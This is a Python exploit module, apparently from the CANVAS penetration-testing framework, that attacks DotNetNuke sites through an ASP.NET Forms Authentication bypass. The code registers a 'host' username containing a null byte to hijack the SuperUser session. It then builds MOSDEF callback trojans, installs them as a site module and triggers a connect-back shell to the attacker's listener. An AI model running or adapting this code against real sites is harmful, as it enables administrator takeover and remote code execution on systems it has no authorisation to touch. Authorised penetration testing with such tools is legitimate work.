from __future__ import with_statement
import sys
if "." not in sys.path: sys.path.append(".")

import os
import urllib2
import ssl
import exploitutils
import canvasengine
import struct
import random
import string
import shutil
import cookielib
from libs import spkproxy, dotnetcookie
from installmodule_aux import DotNetNuke
from tcpexploit import tcpexploit
from libs.canvasos import *
import timeoutsocket
from installmodule_aux import socket_timeout
from libs import MultipartPostHandler
from HTMLParser import HTMLParser

NAME = "dotnetnuke_formbypass"
DESCRIPTION = "ASP.Net Forms Authentication Bypass Vulnerability for DotNetNuke"
VERSION = "1.0"
NOTES = """
"""
CHANGELOG = """
"""
GTK2_DIALOG = "dialog.glade2"

DOCUMENTATION = {}
DOCUMENTATION["Notes"] = """
This exploits takes advantage of an ASP.Net Form Authentication Bypass vulnerability
against DotNetNuke installations.

This will register a new username in the DotNetNuke site starting with "host"
then followed by a null character and some random values.
When logging in with this new user, the server will end up loggin us with the
real host account which is the default SuperUser account in DotNetNuke.

After getting a SuperUser session the exploit will upload and install a new
DotNetNuke module that executes a MOSDEF Callback.
"""

DOCUMENTATION["Example"] = """
"""

PROPERTY = {}
PROPERTY["TYPE"] = "Exploit"
PROPERTY["SITE"] =  "Remote"
PROPERTY["ARCH"] = [ ["Unix"], ["Windows"] ]
PROPERTY["VERSION"] = []

TIMEOUT = 5

def random_string(size=6, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for x in range(size))

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.host           = '127.0.0.1'
        self.path           = '/'
        self.register_path  = 'register.aspx'
        self.register_url   = ""
        self.login_path     = 'login.aspx'
        self.login_url      = ""
        self.url            = None
        self.block          = None
        self.version        = 0
        self.name           = NAME
        self.respath        = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.mosdef_type    = "UNIVERSAL" # | HTTP | DNS
        self.http_ssl       = False
        self.https          = False
        self.setInfo(DESCRIPTION)

    def getArgs(self):
        self.getarg("path")
        if self.path[-1] != "/": self.path += "/"
        self.getarg("register_path")
        self.getarg("login_path")
        self.getarg("https")
        self.mosdef_type    = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v, self.versions[v][0])

    def neededListenerTypes(self):
        self.getArgs()
        if self.mosdef_type == "DNS":
            return [canvasengine.DNSMOSDEF]
        elif self.mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]


    def triggerCallback(self):
        trigger_url = self.url + self.callbackurl
        self.log("Trigger URL: " + trigger_url)

        try:
            response = spkproxy.urlopen(trigger_url)
            if response and "ConnectBack" in response.read():
                self.log("Connectback successfully triggered")
                return 1
            else:
                self.log("ConnectBack module doesn't seems to be installed")
        except Exception:
            self.log("An error ocurred while trying to trigger ConnectBack.")

        return 0

    def exit_fail(self):
        self.setInfo("%s - done (failed)" % NAME)
        return 0

    def run(self):
        global TIMEOUT

        self.getArgs()
        self.setInfo("%s (in progress)" % (NAME))
        self.host = self.target.interface
        proto = "https" if self.https else "http"
        self.url  = '%s://%s%s' % (proto, self.host, self.path)

        # Make sure that url ends with /
        if self.url[-1] != "/": self.url += "/"
        self.register_url  = self.url + self.register_path.lstrip("/")
        self.login_url = self.url + self.login_path.lstrip("/")
        self.log("Base URL: " + self.url)
        self.log("User Registration URL: " + self.register_url)
        self.log("Login URL: " + self.login_url)

        cj = cookielib.CookieJar()
        # Create an SSLContext that does not verify the server's certificate.
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        opener = urllib2.build_opener(MultipartPostHandler.MultipartPostHandler,
                                      urllib2.HTTPCookieProcessor(cj)) #, proxy_handler )

        request = urllib2.Request(self.url, context=ssl_context)
        with socket_timeout(TIMEOUT):
            try:
                response = opener.open(request)
                if response.code != 200 and response.code >= 400:
                    self.log("Bad response code (%d) received from %s. Exiting..." % (response.code, self.url))
                    return self.exit_fail()
            except urllib2.HTTPError, e:
                self.log("Error connecting to %s: %s. Exiting..." % (self.url, str(e)))
                return self.exit_fail()

        # the username must start with host (which is the default SuperUser account)
        # then a null char and something random (to avoid issues if running multiple times)
        username = "host" + chr(0) + random_string(10)
        password = random_string(10)

        # Refresh our viewstate to be able to perform actions on the site
        request = urllib2.Request(self.register_url, context=ssl_context)
        with socket_timeout(TIMEOUT):
            data = opener.open(request).read()

        myparser = DotNetNuke.ViewStateExtractor()
        myparser.feed(data)
        self.viewstate = myparser.getViewState()

        #Create User
        self.log("Creating fake host superuser with null character")
        self.log("Username: %r" % username)
        self.log("Password: %s" % password)
        params = {}
        headers = {}

        params['ScriptManager']='dnn$ctr$ManageUsers_UP|dnn$ctr$ManageUsers$cmdRegister$ctl01'
        params['__EVENTTARGET']='dnn$ctr$ManageUsers$cmdRegister$ctl01'
        params['__EVENTARGUMENT']=''
        params["__VIEWSTATE"] = self.viewstate
        params['dnn$dnnSEARCH$txtSearchNew']=''
        params['dnn$ctr$ManageUsers$User$UserEditor$ctl00$Username']= username
        params['dnn$ctr$ManageUsers$User$UserEditor$ctl01$FirstName']= random_string()
        params['dnn$ctr$ManageUsers$User$UserEditor$ctl02$LastName']= random_string()
        params['dnn$ctr$ManageUsers$User$UserEditor$ctl03$DisplayName']= random_string()
        params['dnn$ctr$ManageUsers$User$UserEditor$ctl04$Email']= random_string() + "@" + random_string() + ".com"
        params['dnn$ctr$ManageUsers$User$txtPassword'] = password
        params['dnn$ctr$ManageUsers$User$txtConfirm'] = password
        params['ScrollTop']=''
        params['__dnnVariable']='{"dshReset_imgIcon:exp":"-1","dshQuestionAnswer_imgIcon:exp":"-1","__scdoff":"1","SearchIconWebUrl":"url(/dotnetnuke/images/Search/google-icon.gif)","SearchIconSiteUrl":"url(/dotnetnuke/images/Search/dotnetnuke-icon.gif)","SearchIconSelected":"S","dnn_dnnNAV_ctldnnNAV_json":"","dnn_dnnNAV_ctldnnNAV_p":""}'

        request = urllib2.Request(self.register_url, params, headers=headers, context=ssl_context)

        with socket_timeout(TIMEOUT):
            try:
                data = opener.open(request).read()
            except urllib2.HTTPError, e:
                self.log("Error performing request to %s: %s. Exiting..." % (self.register_url, str(e)))
                return self.exit_fail()

        myparser = DotNetNuke.ViewStateExtractor()
        myparser.feed(data)
        self.viewstate = myparser.getViewState()

        # now we log in with the created user but instead the dotnetnuke will
        # log us with the real host account and we'll get a useful cookie

        params.clear()
        cj.clear()

        params["__EVENTTARGET"] = ""
        params["__EVENTARGUMENT"] = ""
        params["__VIEWSTATE"] = self.viewstate
        params["dnn$dnnSEARCH$txtSearchNew"] = ""
        params["dnn$ctr$Login$Login_DNN$txtUsername"] = username
        params["dnn$ctr$Login$Login_DNN$txtPassword"] = password
        params["dnn$ctr$Login$Login_DNN$cmdLogin"] = "Login"
        params["ScrollTop"] = ""
        params["__dnnVariable"] = """{"dshReset_imgIcon:exp":"-1","dshQuestionAnswer_imgIcon:exp":"-1","__scdoff":"1","__dnn_pageload":"__dnn_SetInitialFocus('dnn_ctr_Login_Login_DNN_txtUsername');","SearchIconWebUrl":"url(/dotnetnuke/images/Search/google-icon.gif)","SearchIconSiteUrl":"url(/dotnetnuke/images/Search/dotnetnuke-icon.gif)","SearchIconSelected":"S","dnn_dnnNAV_ctldnnNAV_json":"{nodes:[{bcrumb:\"1\",selected:\"1\",id:\"40\",key:\"40\",txt:\"Home\",ca:\"3\",url:\"http://192.168.1.27/dotnetnuke/Home.aspx\",img:\"\",cssIcon:\" \",nodes:[]}]}","dnn_dnnNAV_ctldnnNAV_p":"{callback:'dnn.xmlhttp.doCallBack(\\'ctldnnNAV dnn_dnnNAV_ctldnnNAV\\',\\'[NODEXML]\\',this.callBackSuccess,mNode,this.callBackFail,this.callBackStatus,null,null,0);',sysimgpath:'/dotnetnuke/images/',mbcss:'mainMenu',rmode:'0',suborient:'1',anim:'0',orient:'0',postback:'__doPostBack(\\'dnn$dnnNAV$ctldnnNAV\\',\\'[NODEID]~|~Click\\')',easeDir:'0',easeType:'3'}"}"""

        request = urllib2.Request(self.login_url, params, headers=headers, context=ssl_context)
        with socket_timeout(TIMEOUT):
            try:
                data = opener.open(request).read()
            except urllib2.HTTPError, e:
                self.log("Error performing request to %s: %s. Exiting..." % (self.login_url, str(e)))
                return self.exit_fail()

        if "SuperUser Account" in data:
            self.log("Logged sucessfully!")
        else:
            self.log("Login using the new user account failed")
            return self.exit_fail()

        # build the trojan callbacks that the installer module needs
        if not self.build_trojans():
            self.log("Something failed when creating MOSDEF trojans")
            return self.exit_fail()

        # pass the cookie jar with the host user cookie in it to the installmodule
        myDotNetNuke = DotNetNuke(self.url, cj, self.log)
        ret, callbackurl = myDotNetNuke.install_callback()

        if ret:
            self.log("Module installed. Triggering callback...")
            self.callbackurl = callbackurl
            ret = self.triggerCallback()
        else:
            self.log("Module installation failed!")

        # delete callback files created in resource dir
        for arch in ("X86", "X64"):
            try:
                os.remove(os.path.join(self.respath, "callback_%s.exe" % arch))
            except OSError:
                pass

        if ret:
            self.setInfo("%s - done (Succeded!)" % NAME)
            return ret
        else:
            return self.exit_fail()

    def build_trojans(self):
        """
        Builds mosdef two trojans (x86 & x64) according to the selected mosdef type.
        These two trojans are later used to deploy the DotNetNuke module
        """
        msg = "Building MOSDEF trojans (type: %s)" % self.mosdef_type
        #msg += " - SSL = %s)" % str(self.http_ssl) if self.mosdef_type == "HTTP" else ")"
        self.log(msg)
        if self.mosdef_type == "UNIVERSAL":
            return self.build_universal_trojans()
        elif self.mosdef_type == "HTTP":
            return self.build_universal_trojans(http=True, ssl=self.http_ssl)
        else:
            return self.build_dns_trojans()

    def build_dns_trojans(self):
        filename = os.path.join(self.respath, "callback_X86.exe")
        trojanmod = self.engine.getModuleExploit("BuildDNSCallback")
        trojanmod.link(self)
        trojanmod.argsDict["proxyaddr"] = self.callback.ip

        # XXX: self.dns_domain doesn't exist
        trojanmod.argsDict["domain"]    = self.dns_domain
        trojanmod.argsDict["filename"]  = filename
        ret = trojanmod.run()
        #XXX: DNS mosdef is still not available for 64bits, so just to make it
        # the installer run for now, we just make a copy to have the x64 callback file
        if ret:
            try:
                shutil.copyfile(filename, filename.replace("X86", "X64"))
            except IOError:
                ret = 0
        return ret

    def build_universal_trojans(self, http=False, ssl=False):
        res = True
        t_os = canvasos("WINDOWS")
        for arch in ("X86", "X64"):
            t_os.arch = arch
            try:
                ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                             target_os=t_os, universal=True,
                                             http=http, ssl=ssl, win8_compatible=True)
                if ret:
                    filename = os.path.join(self.respath, "callback_%s.exe" % arch)
                    with open(filename,"wb") as f:
                        f.write(self.mosdeftrojan)
            except Exception, err:
                self.log("Problem building MOSDEF trojan: %s" % str(err))
                res = False
        return res

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
    app = theexploit()
    ret = exploitutils.standard_callback_commandline(app)

